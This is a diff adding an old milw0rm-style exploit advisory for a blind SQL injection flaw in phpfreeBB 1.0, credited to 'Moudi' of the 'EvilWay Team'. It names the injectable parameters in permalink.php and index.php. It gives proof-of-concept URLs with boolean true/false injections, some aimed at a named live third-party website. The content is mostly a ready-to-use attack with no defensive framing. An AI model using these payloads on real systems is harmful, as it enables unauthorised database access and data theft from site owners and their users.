@@ -1,0 +1,42 @@
+/*
+
+              _____       _ ___        __          
+             | ____|_   _(_) \ \      / /_ _ _   _ 
+             |  _| \ \ / / | |\ \ /\ / / _` | | | |
+             | |___ \ V /| | | \ V  V / (_| | |_| |
+             |_____| \_/ |_|_|  \_/\_/ \__,_|\__, |
+                                              |___/ 
+                                    _____                    
+                                   |_   _|__  __ _ _ __ ___  
+                                      | |/ _ \/ _` | '_ ` _ \ 
+                                      | |  __/ (_| | | | | | |
+                                      |_|\___|\__,_|_| |_| |_|
+
+phpfreeBB 1.0 Remote BLIND SQL Injection Vulnerability
+
+Discovered By : Moudi
+Contact : <m0udi@9.cn>
+Download : http://prdownloads.sourceforge.net/phpfreebb/bb.zip?download
+           http://phpfreebb.sourceforge.net/
+
+Greetings : Mizoz, Zuka, str0ke, 599eme Man.
+Please visit: http://unkn0wn.ws/board/index.php
+
+*/
+
+[+] Exploit bSQL:
+
+- Vulnerable code in permalink.php (id).
+- Vulnerable code in index.php (year/archive).
+
+- Poc:
+  http://127.0.0.1/permalink.php?id=[bSQL]
+  http://127.0.0.1/index.php?archive=[NB]&year=[bSQL]
+
+  http://kumi.awardspace.com/diary/permalink.php?id=9+and+1=1 TRUE
+  http://kumi.awardspace.com/diary/permalink.php?id=9+and+1=2 FALSE
+
+  http://kumi.awardspace.com/diary/index.php?archive=5&year=2008+and+1=1 TRUE
+  http://kumi.awardspace.com/diary/index.php?archive=5&year=2008+and+1=2 FALSE
+
+# milw0rm.com [2009-08-18]
